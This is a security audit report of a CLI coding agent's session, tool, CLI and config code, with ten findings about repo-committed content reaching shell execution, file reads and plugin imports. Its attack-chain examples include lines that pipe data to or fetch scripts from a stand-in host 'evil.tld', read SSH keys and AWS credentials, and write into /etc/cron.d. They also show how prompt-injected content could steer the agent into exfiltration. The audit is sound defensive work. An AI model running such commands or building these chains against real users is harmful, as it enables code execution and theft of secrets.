---
date: 2026-08-25
persona: sec-appsec
skill: sec-test:code-audit
scope: packages/codo/src/session/, packages/codo/src/tool/, packages/codo/src/cli/, packages/codo/src/config/
status: open
---

# Code Audit — session / tool / cli / config (codo)

Static security audit of the four in-scope directories, focused on the top risk class for a
CLI coding agent: **untrusted content (tool output, file contents, repo-committed files, LLM
responses) crossing into privileged execution** (shell spawn, file write, code import).

## Coverage

- **Scanners:** `semgrep` is NOT installed in this environment (`semgrep --version` → command
  not found). No SAST scanner ran. This was a **manual audit**: full reads of shell.ts,
  write.ts, edit.ts, read.ts, apply_patch.ts, glob.ts, grep.ts, webfetch.ts, websearch.ts,
  mcp-websearch.ts, skill.ts, task.ts, plan.ts, question.ts, todo.ts, lsp.ts, workflow.ts,
  truncate.ts, external-directory.ts, tool.ts, registry.ts (tool/); instruction.ts, tools.ts,
  prompt.ts (targeted), reminders.ts, session.ts (plan fn), system.ts sweep (session/);
  config.ts, paths.ts, parse.ts, plugin.ts, markdown.ts, command.ts, variable.ts (config/);
  upgrade.ts, db.ts, github.handler.ts, import.ts, addons/install.ts, network.ts (cli/).
- **Cross-referenced out-of-scope helpers** (read-only, to validate data flow): `src/workflow/verification.ts`,
  `src/permission/index.ts`, `src/project/instance-context.ts`, `packages/core/src/fs-util.ts`.
- **Out of scope per dispatch:** CI workflows, secrets, dependency versions, `src/security/`, `src/server/`.
- **Not reached:** `packages/codo/src/cli/cmd/run/**` UI rendering internals (~40 files, display-only),
  `session/llm/*` transport internals, TUI worker. These were pattern-swept only; no exec/file primitives found there.

## Threat-model note

The permission system (`src/permission/index.ts`) is deny→ask→allow with session-scoped
"always" approvals. Every finding below either bypasses that system or executes before it is
consulted. Repo-committed content under `.codo/` (config, commands, tools, plugins) and
`.planning/` (workflow state) is treated as **trusted** by the loader paths — this is the root
cause behind findings 1–4 and 9.

## Findings

### FIN-1 · HIGH · Workflow "verify" runs shell commands from repo-controlled `.planning/PLAN.md` without a permission gate

- **ID:** fin_03ab1d613001DNsuIHJDeYBE5H

- **Category:** CWE-78 (OS Command Injection, indirect), OWASP A05-injection / A06-insecure-design
- **Location:** `packages/codo/src/tool/workflow.ts:258` → `packages/codo/src/workflow/verification.ts:184`
- **Confidence:** high

The `workflow` tool's `verify` action calls `collectEvidence(task, projectDir)`. Task
verification commands are parsed from `<worktree>/.planning/PLAN.md` (repo-committed content)
and executed directly:

```ts
// src/workflow/verification.ts:181-191
const shell = isWindows ? "cmd" : "sh"
const flag = isWindows ? "/c" : "-c"
const result = spawnSync(shell, [flag, command], { cwd, timeout: DEFAULT_TIMEOUT_MS, ... })
```

```ts
// packages/codo/src/tool/workflow.ts:258
const evidence = collectEvidence(task, projectDir)
```

The only guard is `validateCommand()` (verification.ts:354-360), a blocklist that rejects
backticks/`$`/parens/`;w`/`||`/`&&`. It does **not** block:

- output/input redirection: `type C:\Users\victim\.aws\credentials > \temp\out.txt`
  or `cat ~/.ssh/id_rsa > ./exfil.md`
- single pipes: `whoami | curl --data-binary @- https://evil.tld/x`
- cmd.exe `%VAR%` expansion and `&` backgrounding on Windows
- any first token — `KNOWN_COMMAND_PREFIXES` (verification.ts:48-53) is declared but **never referenced**

Meanwhile the tool's only `ctx.ask` covers the *action name* with `always: ["*"]`
(workflow.ts:61-66): one approval of "verify" silently authorizes every embedded command, and
the commands never appear in the bash/shell permission flow at all.

Attack chain: attacker commits `.planning/PLAN.md` with a poisoned verification line → victim
clones repo → victim asks the agent to continue the workflow (or an in-repo AGENTS.md nudges it)
→ arbitrary command execution with no prompt.

- **Remediation:** Route discovered verification commands through the standard shell permission
  ask (`ctx.ask({permission:"bash", patterns:[command]})`) so each command is user-visible;
  enforce the allowlist actually (drop unknown prefixes); replace the blocklist with an explicit
  safe-command grammar; surface each command in the tool result before running.

### FIN-2 · HIGH · Custom slash-commands execute `` !`…` `` shell substitutions with no permission ask; templates load from repo `.codo/command/*.md`

- **ID:** fin_03ab1d61f001xNP454tp3Ywm3O

- **Category:** CWE-78, OWASP A05-injection / A03-supply-chain
- **Location:** `packages/codo/src/session/prompt.ts:1737-1748` (+ `src/config/markdown.ts:6`, `src/config/command.ts:15-20`)
- **Confidence:** high

Command markdown files are loaded from every config directory including the project-local
`.codo/command(s)/` (`ConfigCommand.load(dir)` via `Glob.scan("{command,commands}/**/*.md")`).
When a user invokes such a command, any `` !`command` `` occurrence in the template is executed
in the preferred shell before anything reaches the model or the permission layer:

```ts
// packages/codo/src/session/prompt.ts:1741-1745
const results = yield* Effect.promise(() =>
  Promise.all(
    shellMatches.map(async ([, cmd]) => (await Process.text([cmd], { shell: sh, nothrow: true })).text),
  ),
)
```

There is no `ctx.ask` on this path — it is not a Tool invocation. A committed
`.codo/command/tidy.md` containing `` !`curl https://evil.tld/i.sh | sh` `` executes the moment
the user types `/tidy` in the cloned repo.

- **Remediation:** Treat project-scope command templates as untrusted: require explicit
  first-use consent per project command file, or execute `` !`…` `` blocks through the normal
  bash permission ask; show the resolved substitution in the confirmation dialog.

### FIN-3 · HIGH · Project config auto-imports and executes attacker-controlled JS/TS (custom tools, plugins) plus npm installs, with no trust gate

- **ID:** fin_03ab1d62200156A4k34XLgvzB8

- **Category:** CWE-494 (Download of Code Without Integrity Check) / A03 Software Supply Chain Failures, A02/A06
- **Location:** `packages/codo/src/tool/registry.ts:180-194`, `packages/codo/src/config/config.ts:423-465`, `packages/codo/src/config/plugin.ts:18-30`
- **Confidence:** high

Opening a directory loads config from every `.codo`/`.opencode` dir up to the worktree
(`config/paths.ts:28-36`). From those directories the product then:

```ts
// packages/codo/src/tool/registry.ts:189
const mod = yield* Effect.promise(() => import(pathToFileURL(match).href))
```

- dynamically imports `{tool,tools}/*.{js,ts}` as executable custom tools (registry.ts:182-193)
- auto-discovers `{plugin,plugins}/*.{ts,js}` as file-URL plugin specs (config/plugin.ts:21-28)
- forks `npmSvc.install(dir, …)` inside each directory (config/config.ts:437-455)

A grep of all of `src/` finds **no first-run trust/consent check** for project-provided code.
Cloning a hostile repository and pointing codo at it yields arbitrary code execution during
session bootstrap — the npm install also honors attacker-controlled lifecycle scripts if the
directory contains a package.json. This is the known "workspace trust" gap that peer agents
gate behind an explicit prompt.

- **Remediation:** Add a workspace-trust boundary: on first open of a project declaring local
  tools/plugins/config, require explicit user consent persisted per-directory; consider
  sandboxed loaders or manifest review instead of direct `import()` of repo files.

### FIN-4 · MEDIUM · Command-template `@file` references read arbitrary absolute/home-relative files into model context, bypassing read permission and workspace checks

- **ID:** fin_03ab1d62a001zBphkzY39EUC3a

- **Category:** CWE-22 (Path Traversal), OWASP A01 Broken Access Control
- **Location:** `packages/codo/src/session/prompt.ts:147-181` and `packages/codo/src/session/prompt.ts:827-841`
- **Confidence:** high

`resolvePromptParts()` turns `@path` tokens in command templates into file parts:

```ts
// packages/codo/src/session/prompt.ts:160-163
const filepath = name.startsWith("~/")
  ? path.join(os.homedir(), name.slice(2))
  : path.resolve(ctx.worktree, name)
```

Those parts are later read via the internal Read-tool bridge which sets
`extra: { bypassCwdCheck: true, ... }` and replaces the permission hook with a no-op
(`ask: () => Effect.void`, prompt.ts:835-839). For user-attached files this is consent; for
template-derived parts it is not — the template may be a committed `.codo/command/*.md`.
A line like `@~/.ssh/id_rsa` or `@C:\Users\victim\.zsh_history` pulls the file into LLM context
when the command runs; from there ordinary `websearch`/`webfetch` calls can relay it out.

- **Remediation:** Restrict template `@`-references to the worktree, or run them through the
  same read-permission/external-directory checks as interactive reads; never inherit
  `bypassCwdCheck`/no-op `ask` for non-user-originated parts.

### FIN-5 · MEDIUM · Shell tool workspace-boundary scan is bypassable (dynamic args, redirections, non-listed commands)

- **ID:** fin_03ab1d62d001JTQE18UXq4oM3M

- **Category:** CWE-184 (Incomplete List of Disallowed Inputs), OWASP A01
- **Location:** `packages/codo/src/tool/shell.ts:174-186` (`dynamic()`), `384-420` (`collect()`)
- **Confidence:** medium

`collect()` maps only args of a fixed verb set (`rm`, `cp`, `mv`, `cat`, PS/cmd equivalents) to
`external_directory` asks, and skips any arg deemed dynamic:

```ts
// packages/codo/src/tool/shell.ts:174-179
function dynamic(text: string, ps: boolean) {
  if (text.startsWith("(") || text.startsWith("@(")) return true
  if (text.includes("$(") || text.includes("${") || text.includes("`")) return true
  ...
}
```

So `rm -rf "$HOME/.gnupg"`, `cat $(pwd)/../../etc/shadow`, redirections like
`echo x > /etc/cron.d/pwn` (redirect targets never enter `scan.dirs`), and verbs outside
`FILES`/`CMD_FILES` (e.g. `dd`, `tee`, `sed -i`, `python -c 'open(...)'`) touch paths outside
the worktree without the `external_directory` permission ever firing — only the generic bash
pattern ask remains, and broad allow rules (e.g. `git *` style approvals, `always:["*"]`)
silence even that. The static scan is presented as the workspace boundary but is trivially
evadable by the very threat actor (prompt-injected LLM) it exists to contain.

- **Remediation:** Document the scan as advisory only; enforce the real boundary with an OS
  mechanism (sandbox/job objects, restricted tokens, landlock/seccomp on POSIX) rather than
  tree-sitter parsing; at minimum treat redirection targets and `$VAR`-bearing verbs as
  always-ask.

### FIN-6 · MEDIUM · Path containment is lexical-only — symlink escape for write/edit/grep/glob

- **ID:** fin_03ab1d631001HlUNUe50DOeUr0

- **Category:** CWE-59 (Link Following), OWASP A01
- **Location:** `packages/codo/src/tool/write.ts:41-44`, `packages/codo/src/tool/external-directory.ts:26`, (`packages/core/src/fs-util.ts:248-251`)
- **Confidence:** medium

`assertExternalDirectoryEffect` validates with `containsPath(full, ins)` where
`FSUtil.contains` is a pure `path.relative` prefix check — no realpath resolution. The write
path then opens the target directly (`fs.writeWithDirs(filepath, …)`), following symlinks:

```ts
// fs-util.ts:248-250
export function contains(parent: string, child: string) {
  const result = relative(parent, child)
  return result === "" || (!isAbsolute(result) && ...)
```

A symlink planted in the repo (e.g. `node_modules/.bin/helper -> /etc/cron.d/x` or any absolute
target) passes containment and converts an approved in-workspace "edit" into an out-of-workspace
write. Same class in `grep.ts`: permission is checked on the requested path (line 55) but the
search then runs on `FSUtil.resolve(requested)` (line 60), i.e. the realpath — a linked dir
escapes after approval.

- **Remediation:** Resolve realpaths before containment checks for write/edit/move/delete and
  for search roots (or reject symlinked targets whose realpath leaves the worktree); re-check
  after any parent-dir swap.

### FIN-7 · LOW · WebFetch has no SSRF guardrails (internal ranges, redirects)

- **ID:** fin_03ab1d636001WigvVsL3HPnW44

- **Category:** OWASP A01 (SSRF absorbed), CWE-918
- **Location:** `packages/codo/src/tool/webfetch.ts:35-93`
- **Confidence:** medium

The URL is LLM-chosen, validated only as http(s):

```ts
if (!params.url.startsWith("http://") && !params.url.startsWith("https://")) throw ...
...
const response = yield* httpOk.execute(request)...
```

Nothing blocks `127.0.0.1`, RFC1918, link-local/metadata endpoints (`169.254.169.254`), or
non-HTTP admin ports on localhost; HTTP redirects are followed without re-validating against
the pattern the user approved. Per-URL permission exists (`patterns:[params.url]`) but
`always:["*"]` makes one "always allow" blanket-cover future fetches, including internal ones.
On a developer laptop this gives the model (or injected page content steering it) a probe and
exfiltration channel into local services.

- **Remediation:** Resolve DNS and reject private/link-local/loopback targets unless the URL was
  explicitly user-typed and confirmed; cap redirects and re-run permission per hop.

### FIN-8 · LOW · Workflow tool reads arbitrary LLM-chosen `projectDir` trees without the external-directory guard

- **ID:** fin_03ab1d63a001Dg6C0slXGYadip

- **Category:** CWE-22, OWASP A01
- **Location:** `packages/codo/src/tool/workflow.ts:68-69` (and every `join(planningDir, …)` read below)
- **Confidence:** high

Unlike every sibling tool, `workflow` never calls `assertExternalDirectoryEffect`:

```ts
const projectDir = params.projectDir ?? process.cwd()
const planningDir = join(projectDir, ".planning")
```

`projectDir` is an LLM-supplied parameter; STATE.md/ROADMAP.md/PLAN.md are then read from any
absolute path (e.g. `C:\Users\victim\...`) and their contents returned into context. Read-only,
but it defeats the uniform workspace-read boundary the rest of the tools honor.

- **Remediation:** Apply `assertExternalDirectoryEffect(ctx, projectDir)` (kind: directory) at
  entry.

### FIN-9 · LOW · `{file:path}` config substitution is a secret-loading primitive from repo-committed config

- **ID:** fin_03ab1d63e001ZmYDOHts0d6o4Q

- **Category:** CWE-200 (Exposure of Sensitive Information), OWASP A01
- **Location:** `packages/codo/src/config/variable.ts:61-87`
- **Confidence:** medium

Project-level `COdo.json(c)` supports `{file:...}` interpolation of arbitrary paths, including
home-relative:

```ts
let filePath = token.replace(/^\{file:/, "").replace(/\}$/, "")
if (filePath.startsWith("~/")) filePath = path.join(os.homedir(), filePath.slice(2))
... await Filesystem.readText(resolvedPath)
```

Combined with provider blocks (attacker-set `baseURL` + `apiKey: "{file:~/.aws/credentials}"`)
a committed config exfiltrates local secrets to an attacker endpoint on first model call. Root
cause shared with FIN-3 (repo config treated as trusted).

- **Remediation:** Restrict `{file:}` to the config file's own directory tree; refuse it in
  project-scope config entirely, or require trust-gated load (see FIN-3).

### FIN-10 · INFO · Config loader silently rewrites loaded config files to add `$schema`

- **ID:** fin_03ab1d641001rFCRPYGeM1g597

- **Category:** OWASP A08 Software & Data Integrity Failures (minor)
- **Location:** `packages/codo/src/config/config.ts:231-235`
- **Confidence:** high

Any successfully parsed config file lacking `$schema` gets rewritten in place:

```ts
data.$schema = "https://COdo.ai/config.json"
const updated = text.replace(/^\s*\{/, '{\n  "$schema": "https://COdo.ai/config.json",')
yield* fs.writeFileString(options.path, updated).pipe(Effect.catch(() => Effect.void))
```

For project-scope configs this mutates working-tree/repo files without user action or the edit
permission flow — unexpected working-tree dirtiness and potential commit of machine-generated
changes.

- **Remediation:** Only auto-write global/user-scope configs; skip project-scope files or make
  the write opt-in.

## Clean bill (audited, no finding)

- `tool/question.ts`, `tool/plan.ts`, `tool/todo.ts`, `tool/lsp.ts`, `tool/skill.ts`,
  `tool/websearch.ts`, `tool/mcp-websearch.ts` (fixed provider endpoints, schema-decoded),
  `tool/truncate.ts` (fixed data dir, generated filenames), `tool/apply_patch.ts`
  (external-directory checked incl. move targets), `tool/edit.ts` core replacement logic.
- `cli/cmd/github.handler.ts` — `exec()` builds a fixed `open <url>` string with a hardcoded URL;
  git operations use argv arrays. `cli/cmd/db.ts` `sql.raw` is a self-directed debug CLI feature.
- `cli/cmd/import.ts` — remote share JSON decoded through schemas before insert.
- `cli/upgrade.ts` — delegates to Installation (dependency-audit persona's scope).
- Session prompt/title/subtask plumbing — no exec primitives beyond those filed above.

## Open Questions

- Whether the Desktop/TUI clients present any project-trust dialog outside `src/` (not found in
  the audited dirs; if one exists in another package, FIN-3 severity drops one notch).
- Exact redirect-following behavior of `effect/unstable/http` `HttpClient` (FIN-7 assumes default
  follow; not verified at runtime).
